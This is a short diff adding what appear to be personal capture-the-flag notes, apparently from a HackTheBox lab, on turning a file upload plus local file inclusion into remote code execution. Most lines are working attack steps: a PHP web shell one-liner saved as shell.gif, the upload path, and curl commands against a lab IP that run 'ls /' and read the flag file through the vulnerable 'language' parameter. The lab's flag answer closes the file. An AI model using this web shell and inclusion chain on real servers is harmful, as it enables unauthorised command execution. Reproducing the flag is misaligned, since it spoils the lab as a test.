@@ -1,1 +1,17 @@
 
+most important part here is to understand what file types are allowed to be uploaded. a lot of this can be done by just uploading a fake file, or viewing source code, or using burp 
+
+echo '<?php system($_GET['cmd']); ?>' > shell.gif ->  thats becuase we enumerated and figured out gif extensions are allowed. 
+
+confirm by typing in terminal -> file shell.gif 
+
+upload the shell.gif to the url ->http://STMIP:STMPO/settings.php
+
+
+once uploaded view source page -> and see the uploaded path is -> /profile_images/shell.gif
+
+curl -s -w "\n" 'http://STMIP:STMPO/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
+
+curl -s 'http://165.22.122.134:30504/index.php?language=./profile_images/shell.gif&cmd=cat+/2f40d853e2d4768d87da1c81772bae0a.txt' | grep -v "<.*>"
+
+GIF8HTB{upl04d+lf!+3x3cut3=rc3}
